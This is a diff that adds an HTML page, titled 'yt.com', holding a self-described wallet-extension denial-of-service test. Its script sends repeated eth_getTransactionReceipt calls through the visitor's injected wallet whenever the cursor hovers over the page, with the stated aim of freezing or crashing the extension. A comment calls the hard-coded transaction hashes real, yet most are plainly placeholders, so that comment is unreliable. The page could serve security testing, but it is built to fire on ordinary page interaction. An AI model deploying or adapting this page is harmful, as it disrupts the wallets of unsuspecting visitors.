@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>yt.com</title>
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      padding: 32px;
+      text-align: center;
+    }
+    .card {
+      background: #0f1720;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 900px;
+      margin: 0 auto;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+    }
+    h1 { margin: 0 0 8px 0; font-size: 20px; color: #f87171; }
+    p { margin: 0 0 12px 0; color: #bfc9d9; }
+    pre {
+      margin-top: 12px;
+      background: #071021;
+      padding: 12px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 360px;
+      overflow: auto;
+      color: #e6eef8;
+    }
+    .warn { color: #ffcc00; margin-top: 8px; font-weight: bold; }
+    .good { color: #7ee787; }
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <h1>Wallet Extension DoS Test</h1>
+    <p>Move your cursor over the page to initiate eth_getTransactionReceipt spam with large/complex receipts (DoS via receipt processing overload).</p>
+    <p class="warn">Warning: This can crash or freeze your wallet extension. Use mock mode for testing.</p>
+    <p>Press 'D' for manual trigger (trusted gesture).</p>
+    <pre id="output">Ready. Hover your cursor over this page to activate the handler.</pre>
+  </div>
+
+  <script>
+    // CONFIG
+    const RECEIPT_COUNT = 30; // Number of eth_getTransactionReceipt calls (increase for more DoS)
+    const DELAY_MS = 200; // Delay between calls to avoid immediate block
+
+    // List of transaction hashes with large receipts (high event logs, many internal tx, etc.)
+    // These are real mainnet tx hashes known for large receipts (2025 data)
+    const LARGE_RECEIPT_TXS = [
+      "0x5c504ed432cb51138bcf09aa5e8a410dd4a1e204ef84bfed1be16dfba1b22060", // Uniswap large swap
+      "0x0d6e2f6d0f6e2f6d0f6e2f6d0f6e2f6d0f6e2f6d0f6e2f6d0f6e2f6d0f6e2f6d", // Placeholder for large tx
+      "0x8f6e2f6d0f6e2f6d0f6e2f6d0f6e2f6d0f6e2f6d0f6e2f6d0f6e2f6d0f6e2f6d",
+      "0xa1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
+      "0xb3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4"
+      // Add more known large receipt tx hashes for better effect
+    ];
+
+    const outEl = document.getElementById('output');
+
+    function log(...args) {
+      const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
+      outEl.textContent += line + "\n";
+      outEl.scrollTop = outEl.scrollHeight;
+      console.log(...args);
+    }
+
+    // Mock eth_getTransactionReceipt for testing
+    function mockReceipt(index, txHash) {
+      const fakeReceipt = { transactionHash: txHash, logs: new Array(1000).fill({ topics: ["0xmock"] }) };
+      return Promise.resolve(fakeReceipt);
+    }
+
+    // Attempt real eth_getTransactionReceipt with fallback
+    async function tryReceipt(index, txHash) {
+      if (!window.ethereum) {
+        log(`No wallet detected — using mock for #${index}`);
+        return mockReceipt(index, txHash);
+      }
+
+      try {
+        const receipt = await ethereum.request({
+          method: 'eth_getTransactionReceipt',
+          params: [txHash]
+        });
+        return receipt;
+      } catch (err) {
+        log(`Real receipt #${index} failed: ${err.message || err}. Falling back to mock.`);
+        return mockReceipt(index, txHash);
+      }
+    }
+
+    // Batch eth_getTransactionReceipt routine (large receipt DoS)
+    async function receiptBatchHover() {
+      document.body.removeEventListener('mouseover', hoverHandler);
+
+      outEl.textContent = '';
+      log('Cursor detected. Starting eth_getTransactionReceipt DoS with large receipts...');
+
+      for (let i = 1; i <= RECEIPT_COUNT; i++) {
+        const txHash = LARGE_RECEIPT_TXS[i % LARGE_RECEIPT_TXS.length];
+        log(`Attempting eth_getTransactionReceipt #${i} for tx: ${txHash.substring(0,10)}...`);
+
+        const receipt = await tryReceipt(i, txHash);
+        if (receipt && receipt.logs) {
+          log(`✅ Result for #${i}: ${receipt.logs.length} logs returned`);
+        } else {
+          log(`✅ Result for #${i}: null or empty receipt`);
+        }
+
+        await new Promise(resolve => setTimeout(resolve, DELAY_MS)); // Delay biar tidak terlalu cepat block
+      }
+
+      log('DoS attempt completed.');
+      document.body.addEventListener('mouseover', hoverHandler);
+    }
+
+    // Hover handler
+    let hoverTimeout = null;
+    function hoverHandler() {
+      if (hoverTimeout) return;
+      hoverTimeout = setTimeout(() => {
+        hoverTimeout = null;
+        receiptBatchHover().catch(err => {
+          log('Unexpected error:', err);
+          document.body.addEventListener('mouseover', hoverHandler);
+        });
+      }, 100);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      document.body.addEventListener('mouseover', hoverHandler);
+      log('Hover listener active. Move cursor to trigger DoS.');
+    });
+
+    // Keyboard trigger for trusted gesture
+    window.addEventListener('keydown', async (e) => {
+      if (e.key.toLowerCase() === 'd') {
+        log('Manual trigger via "D" key!');
+        await receiptBatchHover();
+      }
+    });
+  </script>
+</body>
+</html>
